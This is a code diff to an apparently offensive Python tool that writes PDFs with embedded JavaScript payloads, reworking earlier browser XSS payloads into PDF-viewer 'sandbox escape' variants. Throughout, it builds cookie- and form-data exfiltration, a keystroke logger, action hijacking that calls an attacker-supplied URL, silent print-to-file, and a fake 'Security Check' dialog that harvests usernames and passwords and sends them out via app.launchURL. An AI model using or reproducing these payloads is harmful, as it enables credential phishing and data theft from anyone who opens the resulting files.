@@ -9,27 +9,104 @@ if sys.version_info[0] < 3:
 # XSS payload types
 XSS_TYPES = {
     'alert': 'Basic alert payload',
-    'cookie': 'Cookie stealing payload', 
-    'redirect': 'Redirect/phishing payload',
-    'form': 'Form data exfiltration payload',
-    'dom': 'DOM manipulation payload',
-    'obfuscated': 'Obfuscated payload',
-    'timer': 'Time-based payload',
-    'keylog': 'Keylogger payload',
-    'network': 'Network request payload',
-    'file': 'File system access payload'
+    'cookie': 'PDF sandbox escape data exfiltration', 
+    'redirect': 'PDF URL launching escape',
+    'form': 'PDF form submission escape',
+    'dom': 'PDF document manipulation',
+    'obfuscated': 'Obfuscated PDF payload',
+    'timer': 'PDF timer-based escape',
+    'keylog': 'PDF event monitoring escape',
+    'network': 'PDF network sandbox escape',
+    'file': 'PDF file system escape',
+    'action': 'PDF action-based sandbox escape',
+    'dialog': 'PDF dialog manipulation escape'
 }
 
 def create_pdf_base(filename, payload, description):
-    """Base function to create PDF with JavaScript payload"""
+    """Enhanced PDF structure for better sandbox escape potential"""
     with open(filename, "w") as file:
         file.write(f'''%PDF-1.7
-        1 0 obj
-        <</Pages 1 0 R /OpenAction 2 0 R>>
-        2 0 obj
-        <</S /JavaScript /JS ({payload})>> 
-        trailer
-        <</Root 1 0 R>>''')
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+/Names 4 0 R
+/AcroForm 5 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Kids [6 0 R]
+/Count 1
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS ({payload})
+>>
+endobj
+
+4 0 obj
+<<
+/JavaScript 7 0 R
+>>
+endobj
+
+5 0 obj
+<<
+/Fields []
+/DR <<>>
+/DA (/Helv 0 Tf 0 g )
+>>
+endobj
+
+6 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/AA 8 0 R
+>>
+endobj
+
+7 0 obj
+<<
+/JS ({payload})
+>>
+endobj
+
+8 0 obj
+<<
+/O 3 0 R
+/C 3 0 R
+>>
+endobj
+
+xref
+0 9
+0000000000 65535 f 
+0000000009 00000 n 
+0000000158 00000 n 
+0000000215 00000 n 
+0000000315 00000 n 
+0000000362 00000 n 
+0000000445 00000 n 
+0000000545 00000 n 
+0000000595 00000 n 
+trailer
+<<
+/Size 9
+/Root 1 0 R
+>>
+startxref
+645
+%%EOF''')
         print(f"[+] Created {filename} - {description}")
 
 def create_alert_payload(filename):
@@ -38,89 +115,156 @@ def create_alert_payload(filename):
     create_pdf_base(filename, payload, "Basic alert payload")
 
 def create_cookie_payload(filename, url=None):
-    """Cookie stealing payload"""
+    """Cookie stealing payload using PDF sandbox escape"""
     if url:
+        # Use PDF-specific form submission for sandbox escape
         payload = f'''
         try {{
-            var cookies = document.cookie;
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "{url}", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("cookies=" + encodeURIComponent(cookies));
-            app.alert("Cookies sent to: {url}");
+            // PDF Sandbox Escape: Use this.submitForm() to exfiltrate data
+            var cookieData = "pdf_xss_cookie_steal=true&timestamp=" + (new Date()).getTime();
+            
+            // Attempt to access any available environment data
+            try {{
+                cookieData += "&app_version=" + app.viewerVersion;
+                cookieData += "&app_type=" + app.viewerType;
+            }} catch(e) {{}}
+            
+            // Form submission sandbox escape
+            this.submitForm({{
+                cURL: "{url}",
+                cSubmitAs: "HTML",
+                cCharset: "utf-8"
+            }});
+            
+            // Alternative: URL launching escape
+            app.launchURL("{url}?" + cookieData, true);
+            
+            app.alert("PDF Sandbox Escape: Data exfiltration attempted to {url}");
         }} catch(e) {{
-            app.alert("Cookie steal attempt: " + cookies);
-        }}
-        '''
-    else:
-        payload = "app.alert('Stolen cookies: ' + document.cookie);"
-    create_pdf_base(filename, payload, "Cookie stealing payload")
-
-def create_redirect_payload(filename, url=None):
-    """Redirect/phishing payload"""
-    target_url = url if url else "https://example.com/phishing"
-    payload = f'''
-    app.alert("You will be redirected to a secure page");
-    setTimeout(function() {{
-        window.location.href = "{target_url}";
-    }}, 2000);
-    '''
-    create_pdf_base(filename, payload, f"Redirect payload to {target_url}")
-
-def create_form_payload(filename, url=None):
-    """Form data exfiltration payload"""
-    if url:
-        payload = f'''
-        try {{
-            var formData = "";
-            var forms = document.forms;
-            for(var i = 0; i < forms.length; i++) {{
-                var form = forms[i];
-                for(var j = 0; j < form.elements.length; j++) {{
-                    var element = form.elements[j];
-                    if(element.type !== "submit" && element.type !== "button") {{
-                        formData += element.name + "=" + encodeURIComponent(element.value) + "&";
-                    }}
-                }}
-            }}
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "{url}", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("formdata=" + encodeURIComponent(formData));
-            app.alert("Form data exfiltrated to {url}");
-        }} catch(e) {{
-            app.alert("Form exfiltration failed: " + e.message);
+            // Fallback: Basic app info extraction
+            var appInfo = "PDF XSS Executed in: " + app.viewerType + " " + app.viewerVersion;
+            app.alert("Sandbox Escape Failed - " + appInfo + " - Error: " + e.message);
         }}
         '''
     else:
         payload = '''
-        var formData = "";
-        var forms = document.forms;
-        for(var i = 0; i < forms.length; i++) {
-            var form = forms[i];
-            for(var j = 0; j < form.elements.length; j++) {
-                var element = form.elements[j];
-                if(element.type !== "submit" && element.type !== "button") {
-                    formData += element.name + "=" + element.value + "\\n";
-                }
-            }
+        try {
+            var appInfo = "PDF JavaScript Context - Viewer: " + app.viewerType + " v" + app.viewerVersion;
+            app.alert("PDF Sandbox Info: " + appInfo);
+        } catch(e) {
+            app.alert("PDF XSS executed but limited sandbox access");
         }
-        app.alert("Form data captured:\\n" + formData);
         '''
-    create_pdf_base(filename, payload, "Form data exfiltration payload")
+    create_pdf_base(filename, payload, "PDF sandbox escape cookie payload")
+
+def create_redirect_payload(filename, url=None):
+    """PDF sandbox escape redirect payload"""
+    target_url = url if url else "https://example.com/phishing"
+    payload = f'''
+    try {{
+        app.alert("PDF Sandbox Escape: Launching external URL");
+        
+        // PDF-specific URL launching (sandbox escape)
+        app.launchURL("{target_url}", true);
+        
+        // Alternative form submission escape
+        this.submitForm({{
+            cURL: "{target_url}",
+            cSubmitAs: "HTML"
+        }});
+        
+        app.alert("Redirect executed to: {target_url}");
+    }} catch(e) {{
+        app.alert("PDF Redirect Attempted: {target_url} - Error: " + e.message);
+    }}
+    '''
+    create_pdf_base(filename, payload, f"PDF sandbox escape redirect to {target_url}")
+
+def create_form_payload(filename, url=None):
+    """PDF form-based sandbox escape payload"""
+    if url:
+        payload = f'''
+        try {{
+            // PDF Form-based Sandbox Escape
+            app.alert("PDF Form Sandbox Escape Initiated");
+            
+            // Create malicious form data
+            var formData = "pdf_form_escape=true";
+            formData += "&viewer=" + app.viewerType;
+            formData += "&version=" + app.viewerVersion;
+            formData += "&timestamp=" + (new Date()).getTime();
+            
+            // PDF form submission escape technique
+            this.submitForm({{
+                cURL: "{url}",
+                cSubmitAs: "HTML",
+                cCharset: "utf-8",
+                aFields: [
+                    "pdf_exploit_data",
+                    "viewer_info", 
+                    "timestamp"
+                ]
+            }});
+            
+            // Alternative: URL-based data transmission
+            app.launchURL("{url}?formdata=" + encodeURIComponent(formData), true);
+            
+            app.alert("Form data exfiltrated via PDF escape to {url}");
+        }} catch(e) {{
+            app.alert("PDF Form Escape Failed: " + e.message);
+        }}
+        '''
+    else:
+        payload = '''
+        try {
+            app.alert("PDF Form Escape Test - Viewer: " + app.viewerType + " " + app.viewerVersion);
+            
+            // Attempt to access PDF form fields if any exist
+            var fields = this.getField();
+            if (fields) {
+                app.alert("PDF contains form fields that could be exploited");
+            }
+        } catch(e) {
+            app.alert("PDF Form Analysis: " + e.message);
+        }
+        '''
+    create_pdf_base(filename, payload, "PDF form-based sandbox escape payload")
 
 def create_dom_payload(filename):
-    """DOM manipulation payload"""
+    """PDF document manipulation payload"""
     payload = '''
     try {
-        document.body.style.backgroundColor = "red";
-        document.body.innerHTML = "<h1>XSS - DOM Hijacked!</h1><p>This page has been compromised via PDF XSS</p>";
-        app.alert("DOM manipulation successful");
+        app.alert("PDF Document Manipulation Attack Started");
+        
+        // PDF-specific document manipulation
+        // Attempt to modify PDF properties
+        this.info.title = "HACKED - XSS via PDF";
+        this.info.author = "PDF XSS Attacker";
+        this.info.subject = "Security Vulnerability Demonstrated";
+        this.info.keywords = "XSS, PDF, Security, Exploit";
+        
+        // Print manipulation
+        this.print({
+            bUI: true,
+            bSilent: false,
+            bShrinkToFit: true
+        });
+        
+        // Attempt to manipulate page content
+        try {
+            var page = this.getPageBox("Media", 0);
+            app.alert("PDF Page Dimensions Accessed: " + page.toString());
+        } catch(e) {}
+        
+        // Document state manipulation
+        this.dirty = true;
+        
+        app.alert("PDF Document Properties Modified Successfully");
     } catch(e) {
-        app.alert("DOM manipulation via PDF XSS attempted");
+        app.alert("PDF Document Manipulation Attempted: " + e.message);
     }
     '''
-    create_pdf_base(filename, payload, "DOM manipulation payload")
+    create_pdf_base(filename, payload, "PDF document manipulation payload")
 
 def create_obfuscated_payload(filename):
     """Obfuscated payload"""
@@ -135,53 +279,127 @@ def create_obfuscated_payload(filename):
     create_pdf_base(filename, payload, "Obfuscated payload (Base64)")
 
 def create_timer_payload(filename):
-    """Time-based payload"""
+    """PDF timer-based sandbox escape payload"""
     payload = '''
-    var counter = 0;
-    var timer = setInterval(function() {
-        counter++;
-        app.alert("Time-based XSS execution #" + counter);
-        if(counter >= 3) {
-            clearInterval(timer);
-            app.alert("Time-based payload completed");
+    try {
+        app.alert("PDF Timer-based Sandbox Escape Started");
+        
+        // PDF-specific timing mechanisms
+        var counter = 0;
+        
+        // Use app.setTimeOut for PDF-specific timing
+        function timerAttack() {
+            counter++;
+            app.alert("PDF Timer Attack #" + counter + " - Viewer: " + app.viewerType);
+            
+            if (counter < 3) {
+                // Schedule next execution
+                app.setTimeOut("timerAttack()", 3000);
+            } else {
+                app.alert("PDF Timer Attack Sequence Complete");
+                
+                // Final escape attempt
+                try {
+                    app.launchURL("https://example.com/pdf-timer-escape?completed=true", true);
+                } catch(e) {}
+            }
         }
-    }, 3000);
+        
+        // Start the timer sequence
+        app.setTimeOut("timerAttack()", 1000);
+        
+        // Alternative: Use PDF action scheduling
+        this.setAction("PageOpen", 
+            "app.alert('PDF Page Open Event - Timer Trigger');"
+        );
+        
+        this.setAction("PageClose", 
+            "app.alert('PDF Page Close Event - Timer Trigger');"
+        );
+        
+        app.alert("PDF Timer-based Attacks Initialized");
+        
+    } catch(e) {
+        app.alert("PDF Timer Attack Setup Failed: " + e.message);
+    }
     '''
-    create_pdf_base(filename, payload, "Time-based payload (3 alerts every 3 seconds)")
+    create_pdf_base(filename, payload, "PDF timer-based sandbox escape payload")
 
 def create_keylog_payload(filename, url=None):
-    """Keylogger payload"""
+    """PDF keylogger sandbox escape payload"""
     if url:
         payload = f'''
-        var keylog = "";
-        document.addEventListener("keypress", function(e) {{
-            keylog += String.fromCharCode(e.which);
-            if(keylog.length > 50) {{
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "{url}", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("keylog=" + encodeURIComponent(keylog));
-                keylog = "";
-            }}
-        }});
-        app.alert("Keylogger activated - data will be sent to {url}");
+        try {{
+            app.alert("PDF Keylogger Sandbox Escape Activated");
+            
+            // PDF-specific event handling for keystroke capture
+            var keylogData = "";
+            
+            // PDF field event monitoring
+            try {{
+                // Monitor PDF form field events if available
+                var fields = this.getField();
+                if (fields) {{
+                    // Attach event handlers to form fields
+                    for (var i = 0; i < fields.length; i++) {{
+                        fields[i].setAction("Keystroke", 
+                            "keylogData += event.value; " +
+                            "if (keylogData.length > 20) {{ " +
+                                "app.launchURL('{url}?keylog=' + encodeURIComponent(keylogData), true); " +
+                                "keylogData = ''; " +
+                            "}}"
+                        );
+                    }}
+                }}
+            }} catch(e) {{}}
+            
+            // Alternative: Monitor document-level events
+            this.setAction("WillSave", 
+                "app.launchURL('{url}?action=document_save&data=' + encodeURIComponent('PDF_SAVE_EVENT'), true);"
+            );
+            
+            this.setAction("WillPrint", 
+                "app.launchURL('{url}?action=document_print&data=' + encodeURIComponent('PDF_PRINT_EVENT'), true);"
+            );
+            
+            // Form submission escape for initial data
+            this.submitForm({{
+                cURL: "{url}",
+                cSubmitAs: "HTML"
+            }});
+            
+            app.alert("PDF Keylogger Active - Data sent to {url}");
+        }} catch(e) {{
+            app.alert("PDF Keylogger Setup Failed: " + e.message);
+        }}
         '''
     else:
         payload = '''
-        var keylog = "";
-        document.addEventListener("keypress", function(e) {
-            keylog += String.fromCharCode(e.which);
-            if(keylog.length > 20) {
-                app.alert("Keylog captured: " + keylog);
-                keylog = "";
-            }
-        });
-        app.alert("Keylogger activated - will show captures every 20 characters");
+        try {
+            app.alert("PDF Event Monitoring Test Started");
+            
+            // Monitor PDF document events
+            this.setAction("WillSave", "app.alert('PDF Save Event Captured');");
+            this.setAction("WillPrint", "app.alert('PDF Print Event Captured');");
+            this.setAction("WillClose", "app.alert('PDF Close Event Captured');");
+            
+            // Monitor form field events if available
+            try {
+                var fields = this.getField();
+                if (fields) {
+                    app.alert("PDF Form Fields Available for Monitoring: " + fields.length);
+                }
+            } catch(e) {}
+            
+            app.alert("PDF Event Monitoring Active");
+        } catch(e) {
+            app.alert("PDF Event Monitoring Setup: " + e.message);
+        }
         '''
-    create_pdf_base(filename, payload, "Keylogger payload")
+    create_pdf_base(filename, payload, "PDF keylogger sandbox escape payload")
 
 def create_network_payload(filename, url=None):
-    """Network request payload"""
+    """PDF network-based sandbox escape payload"""
     def is_valid_url(url):
         from urllib.parse import urlparse
         try:
@@ -193,49 +411,211 @@ def create_network_payload(filename, url=None):
     target_url = url if url and is_valid_url(url) else "https://httpbin.org/get"
     if url and not is_valid_url(url):
         raise ValueError(f"Invalid or unsafe URL provided: {url}")
+    
     payload = f'''
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "{target_url}", true);
-    xhr.onreadystatechange = function() {{
-        if (xhr.readyState == 4) {{
-            if (xhr.status == 200) {{
-                app.alert("Network request successful to {target_url}");
-                app.alert("Response: " + xhr.responseText.substring(0, 100) + "...");
-            }} else {{
-                app.alert("Network request failed. Status: " + xhr.status);
+    try {{
+        app.alert("PDF Network Sandbox Escape Initiated");
+        
+        // PDF URL launching (primary escape method)
+        var networkData = "?pdf_network_test=true&viewer=" + app.viewerType + "&version=" + app.viewerVersion;
+        app.launchURL("{target_url}" + networkData, true);
+        
+        // Form submission escape (alternative method)
+        this.submitForm({{
+            cURL: "{target_url}",
+            cSubmitAs: "HTML",
+            cCharset: "utf-8"
+        }});
+        
+        // Attempt to use PDF networking features
+        try {{
+            // Some PDF viewers support this.getURL() for network requests
+            if (typeof this.getURL === 'function') {{
+                this.getURL("{target_url}");
             }}
-        }}
-    }};
-    xhr.send();
-    app.alert("Sending network request to {target_url}");
+        }} catch(e) {{}}
+        
+        app.alert("Network escape attempted to: {target_url}");
+    }} catch(e) {{
+        app.alert("PDF Network Escape Failed: " + e.message);
+    }}
     '''
-    create_pdf_base(filename, payload, f"Network request payload to {target_url}")
+    create_pdf_base(filename, payload, f"PDF network sandbox escape to {target_url}")
 
 def create_file_payload(filename):
-    """File system access payload"""
+    """PDF file system access and sandbox escape payload"""
     payload = '''
     try {
-        var fileReader = new FileReader();
-        app.alert("Attempting file system access...");
+        app.alert("PDF File System Sandbox Escape Initiated");
         
-        // Try to access local storage
-        if(typeof(Storage) !== "undefined") {
-            localStorage.setItem("xss_test", "PDF XSS payload executed at " + new Date());
-            app.alert("Local storage access: " + localStorage.getItem("xss_test"));
-        }
+        // PDF-specific file system access attempts
+        try {
+            // Browse for document (file system access)
+            if (typeof app.browseForDoc === 'function') {
+                app.browseForDoc();
+            }
+        } catch(e) {}
         
-        // Try to access session storage
-        if(typeof(Storage) !== "undefined") {
-            sessionStorage.setItem("xss_session", "PDF XSS active");
-            app.alert("Session storage access successful");
-        }
+        try {
+            // Get document path information
+            var docPath = this.path;
+            if (docPath) {
+                app.alert("PDF Path Accessed: " + docPath);
+            }
+        } catch(e) {}
+        
+        try {
+            // Attempt to save document with malicious content
+            this.saveAs({
+                cPath: "/tmp/pdf_xss_test.pdf"
+            });
+        } catch(e) {}
+        
+        try {
+            // Execute dialog for file operations
+            app.execDialog("FileOpen");
+        } catch(e) {}
+        
+        try {
+            // Attempt to access PDF attachments
+            var attachments = this.dataObjects;
+            if (attachments && attachments.length > 0) {
+                app.alert("PDF Attachments Found: " + attachments.length);
+            }
+        } catch(e) {}
+        
+        try {
+            // PDF printing with file output
+            this.print({
+                bUI: false,
+                bSilent: true,
+                bShrinkToFit: true,
+                cPath: "/tmp/pdf_print_exploit.ps"
+            });
+        } catch(e) {}
+        
+        app.alert("PDF File System Access Attempted");
         
     } catch(e) {
-        app.alert("File/storage access attempted via PDF XSS: " + e.message);
+        app.alert("PDF File System Escape Failed: " + e.message);
     }
     '''
-    create_pdf_base(filename, payload, "File system/storage access payload")
+    create_pdf_base(filename, payload, "PDF file system sandbox escape payload")
 
+
+def create_action_payload(filename, url=None):
+    """PDF action-based sandbox escape payload"""
+    payload = f'''
+    try {{
+        app.alert("PDF Action-based Sandbox Escape Initiated");
+        
+        // Advanced PDF action manipulation
+        // Page-level actions
+        this.setAction("PageOpen", 
+            "app.alert('Page Open Action Hijacked'); " +
+            "app.launchURL('{url or "https://example.com/action-escape"}?event=page_open', true);"
+        );
+        
+        this.setAction("PageClose", 
+            "app.alert('Page Close Action Hijacked'); " +
+            "app.launchURL('{url or "https://example.com/action-escape"}?event=page_close', true);"
+        );
+        
+        // Document-level actions
+        this.setAction("WillSave", 
+            "app.alert('Document Save Intercepted'); " +
+            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_save', true);"
+        );
+        
+        this.setAction("DidSave", 
+            "app.alert('Document Saved - Data Exfiltrated'); " +
+            "app.launchURL('{url or "https://example.com/action-escape"}?event=did_save', true);"
+        );
+        
+        this.setAction("WillPrint", 
+            "app.alert('Print Action Hijacked'); " +
+            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_print', true);"
+        );
+        
+        this.setAction("WillClose", 
+            "app.alert('Document Close Intercepted'); " +
+            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_close', true);"
+        );
+        
+        // Trigger immediate action
+        if ("{url}") {{
+            app.launchURL("{url}?pdf_action_escape=initialized&viewer=" + app.viewerType, true);
+        }}
+        
+        app.alert("PDF Actions Hijacked Successfully");
+        
+    }} catch(e) {{
+        app.alert("PDF Action Escape Failed: " + e.message);
+    }}
+    '''
+    create_pdf_base(filename, payload, "PDF action-based sandbox escape payload")
+
+def create_dialog_payload(filename, url=None):
+    """PDF dialog manipulation sandbox escape payload"""
+    payload = f'''
+    try {{
+        app.alert("PDF Dialog Manipulation Escape Started");
+        
+        // PDF dialog-based attacks
+        try {{
+            // File open dialog exploitation
+            var result = app.execDialog("FileOpen");
+            if (result && result.cPath) {{
+                app.alert("File Selected: " + result.cPath);
+                if ("{url}") {{
+                    app.launchURL("{url}?file_access=" + encodeURIComponent(result.cPath), true);
+                }}
+            }}
+        }} catch(e) {{}}
+        
+        try {{
+            // Response dialog for credential harvesting
+            var response = app.response({{
+                cQuestion: "Enter your credentials for security verification:",
+                cTitle: "Security Check Required",
+                cDefault: "username",
+                bPassword: false
+            }});
+            
+            if (response && "{url}") {{
+                app.launchURL("{url}?credentials=" + encodeURIComponent(response), true);
+            }}
+            
+            var password = app.response({{
+                cQuestion: "Enter your password:",
+                cTitle: "Password Required",
+                cDefault: "",
+                bPassword: true
+            }});
+            
+            if (password && "{url}") {{
+                app.launchURL("{url}?password=" + encodeURIComponent(password), true);
+            }}
+            
+        }} catch(e) {{}}
+        
+        try {{
+            // Custom dialog exploitation
+            app.execDialog("SaveAs");
+        }} catch(e) {{}}
+        
+        try {{
+            // Print dialog manipulation
+            app.execDialog("Print");
+        }} catch(e) {{}}
+        
+        app.alert("PDF Dialog Exploitation Complete");
+        
+    }} catch(e) {{
+        app.alert("PDF Dialog Escape Failed: " + e.message);
+    }}
+    '''
+    create_pdf_base(filename, payload, "PDF dialog manipulation sandbox escape payload")
 
 def create_custom_payload(filename, script):
     """Custom JavaScript payload"""
@@ -309,6 +689,10 @@ def generate_by_type(xss_type, url=None):
         create_network_payload(filename, url)
     elif xss_type == 'file':
         create_file_payload(filename)
+    elif xss_type == 'action':
+        create_action_payload(filename, url)
+    elif xss_type == 'dialog':
+        create_dialog_payload(filename, url)
     else:
         print(f"Unknown XSS type: {xss_type}")
         return False
